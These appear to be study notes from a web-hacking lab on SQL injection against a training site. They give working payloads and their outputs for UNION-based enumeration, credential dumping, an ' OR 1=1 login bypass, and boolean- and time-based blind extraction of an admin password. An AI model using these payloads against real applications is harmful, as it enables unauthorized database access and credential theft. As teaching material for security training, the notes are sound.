---
layout: default
title: SQL Injection
parent: Introduction to Web Hacking
nav_order: 11
---

# SQL Injection

## Terms
- **Structured Query Language Injection (SQLi)**
    - An attack on a web application database server that causes malicious queries to be executed.

## Database
- A database is controlled by a **Database Management System (DBMS)**

**Database Management System (DBMS)**
- **Relational**
    - **MySQL**
    - **Microsoft SQL Server**
    - **Access**
    - **PostgreSQL**
    - **SQLite**
- **Non-Relational**
    - **MongoDB**
    - **Cassandra**
    - **ElasticSearch**

**Relational**

Stores information in tables

**Non-Relational**

Doesn't use tables, columns and rows to store the data.

## SQL
- Some database servers have their own syntax
- SQL syntax is not case-sensitive
- `select`
    - `LIMIT`
        1. The first number tells the database, how many results to skip.
        1. Tells the database how many rows to return.
            - `LIMIT 1`, To return only one row of data.
            - `LIMIT 1,1`, To skip the first result.
            - `LIMIT 2,1`, To skip the first two results.
    - `%`
        - Starts or ends with certain characters
            - `a%`, Beginning with the letter `a`.
            - `%n`, Ending with the letter `n`.
            - `%mi%`, Containing the characters `mi` within them.
- `union`
    - Table name: `customers`

        |id|name|address|city|postcode|
        |---|---|---|---|---|
        |1|Mr John Smith|123 Fake Street|Manchester|M2 3FJ|
        |2|Mrs Jenny Palmer|99 Green Road|Birmingham|B2 4KL|
        |3|Miss Sarah Lewis|15 Fore Street|London|NW12 3GH|
    - Table name: `suppliers`

        |id|company|address|city|postcode|
        |---|---|---|---|---|
        |1|Widgets Ltd|Unit 1a, Newby Estate|Bristol|BS19 4RT|
        |2|The Tool Company|75 Industrial Road|Norwich|N22 3DR|
        |3|Axe Makers Ltd|2b Makers Unit, Market Road |London|SE9 1KK|
    - `SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;`

        |name|address|city|postcode|
        |---|---|---|---|
        |Mr John Smith|123 Fake Street|Manchester|M2 3FJ|
        |Mrs Jenny Palmer|99 Green Road|Birmingham|B2 4KL|
        |Miss Sarah Lewis|15 Fore Street|London|NW12 3GH|
        |Widgets Ltd|Unit 1a, Newby Estate|Bristol|BS19 4RT|
        |The Tool Company|75 Industrial Road|Norwich|N22 3DR|
        |Axe Makers Ltd|2b Makers Unit, Market Road |London|SE9 1KK|
- `insert`
    - Table name: `into users`

        |id|username|password|
        |---|---|---|
        |1|jon|pass123|
        |2|admin|p4ssword|
        |3|martin|secret123|
    - `insert into users (username,password) values ('bob','password123');`

        |id|username|password|
        |---|---|---|
        |1|jon|pass123|
        |2|admin|p4ssword|
        |3|martin|secret123|
        |4|bob|password123|
- `update`
    - Table name: `users`

        |id|username|password|
        |---|---|---|
        |1|jon|pass123|
        |2|admin|p4ssword|
        |3|martin|secret123|
        |4|bob|password123|
    - `update users SET username='root',password='pass123' where username='admin';`

        |id|username|password|
        |---|---|---|
        |1|jon|pass123|
        |2|root|pass123|
        |3|martin|secret123|
        |4|bob|password123|
- `delete`
    - Table name: `users`

        |id|username|password|
        |---|---|---|
        |1|jon|pass123|
        |2|admin|p4ssword|
        |3|martin|secret123|
        |4|bob|password123|
    - `delete from users where username='martin';`

        |id|username|password|
        |---|---|---|
        |1|jon|pass123|
        |2|admin|p4ssword|
        |3|bob|password123|

## SQL Injection
When user-provided data gets included in the SQL query.

**For example**
1. An online blog, each blog entry has a unique ID number.
    - URL: `https://website.thm/blog?id=1`
    - The blog entry selected comes from the id parameter in the query string.
1. The blog entries may be public or private.
1. The web application needs to retrieve the article from the database.
    - SQL: `SELECT * from blog where id=1 and private=0 LIMIT 1;`
    1. Looking in the blog table for an article with the id number of 1.
    1. The private column set to 0.

- **In-Band Injection**
- **Blind Injection**
- **Out-of-Band Injection**

## In-Band Injection
### IN-Band SQL Injection Example
1. Article ID 2 is still locked as private.
    - URL: `https://website.thm/blog?id=2;--`
    - SQL: `SELECT * from blog where id=2;-- and private=0 LIMIT 1;`
    - `;`, The end of the SQL statement
    - `--`, Cause everything afterwards to be treated as a comment.
        - SQL: `SELECT * from blog where id=2;--`
    - Return the article with an ID of 2 whether it is set to public or not.

- **Error-Based SQL Injection**
    - To break the code's SQL query, `'` OR `"`
- **Union-Based SQL Injection**

**Practical**
- A blog with different articles, accessed by changing the id number in the query string.
    - Testing **Error-Based SQL Injection**
    1. URL: `https://website.thm/article?id=1'`
        ```diff
        SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
        ```
        - This error message confirms the existence of an SQL Injection vulnerability.
    1. URL: `https://website.thm/article?id=1 UNION SELECT 1`
        ```diff
        SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
        ```
    1. URL: `https://website.thm/article?id=1 UNION SELECT 1,2`
        ```diff
        SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
        ```
    1. URL: `https://website.thm/article?id=1 UNION SELECT 1,2,3`
        ```diff
        My First Article

        Article ID: 1
        Hi and welcome to my very first article for my new website......
        ```
    1. URL: `https://website.thm/article?id=0 UNION SELECT 1,2,3`
        ```diff
        2

        Article ID: 1
        3
        ```
    1. URL: `https://website.thm/article?id=0 UNION SELECT 1,2,database()`
        ```diff
        2

        Article ID: 1
        sqli_one
        ```
        - Get the database name.
    1. URL: `https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`
        ```diff
        2

        Article ID: 1
        article,staff_users
        ```
        - A list of tables that are in this database.
        - `group_concat()`, Gets the specified column `table_name` from multiple returned rows.
        - `information_schema`, Contains information about all the databases and tables.
        - `sqli_one` Database, `article` and `staff_users` tables.
    1. URL: `https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`
    1. URL: `https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
        - `group_concat`, To return all of the rows into one string.
        - `:`, To split the username and password from each other.
        - `<br>`, Forces each result to be on a separate line.

## Blind Injection
- Error messages have been disabled.
### Authentication Bypass
- **Login forms**
- The web application is asking the database
    1. **Web Application**, Do you have a user with the username bob and the password bob123?
    1. **Database**, either yes or no (true/false)

**Practical**
1. SQL: `select * from users where username='%username%' and password='%password%' LIMIT 1;`
1. SQL: `' OR 1=1;--`
    - Always returns as true
    - SQL: `select * from users where username='' and password='' OR 1=1;`
    - Satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed..
1. SQL: `select * from users where username='' and password='' LIMIT 1;`
1. SQL: `select * from users where username='' and password='`' OR 1=1;--`' LIMIT 1;`

### Boolean-Based
- URL: `https://website.thm/checkuser?username=admin`
    - Output: `{"taken":true}`
    - SQL: `select * from users where username = '%username%' LIMIT 1;`
- URL: `https://website.thm/checkuser?username=admin123' UNION SELECT 1;--`
    - Output: `{"taken":false}`
- URL: `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2;--`
    - Output: `{"taken":false}`
- URL: `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3;--`
    - Output: `{"taken":true}`
- URL: `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like '%';--`
    - Output: `{"taken":true}`
- URL: `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 's%';--`
    - Output: `{"taken":true}`
- URL: `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'sqli_three%';--`
    - Output: `{"taken":true}`
- URL: `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'users%';--`
    - Output: `{"taken":true}`
- URL: `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--`
    - Output: `{"taken":true}`
- URL: `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'id%';`
    - Output: `{"taken":true}`
- URL: `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'username%' and COLUMN_NAME !='id';`
    - Output: `{"taken":true}`
- URL: `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'password%' and COLUMN_NAME !='id';`
    - Output: `{"taken":true}`
- URL: `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username like 'admin%`
    - Output: `{"taken":true}`
- URL: `https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3845%`
    - Output: `{"taken":true}`

### Time-Based
The time the query takes to complete
- The `sleep()` method will only ever get executed upon a successful `UNION` SELECT statement.
    - `sleep(x)`
    - `UNION`

1. `https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5);--`
    - The number of columns in a table.
1. `https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2;--`
    - A 5-second delay, confirming the successful execution of the UNION statement.
1. `https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--`
1. `https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four%';--`
1. `https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users%';--`
1. `https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name='users';--`
1. `https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'id%';`
1. `https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'username%' and COLUMN_NAME !='id';`
1. `https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password%' and COLUMN_NAME !='id';`
1. `https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin%`
1. `https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 from users where username='admin' and password like '4961%`

## Out-of-Band Injection
Is classified by having two different communication channels.
1. To launch the attack, for example a web request.
1. To gather the results, monitoring HTTP/DNS requests.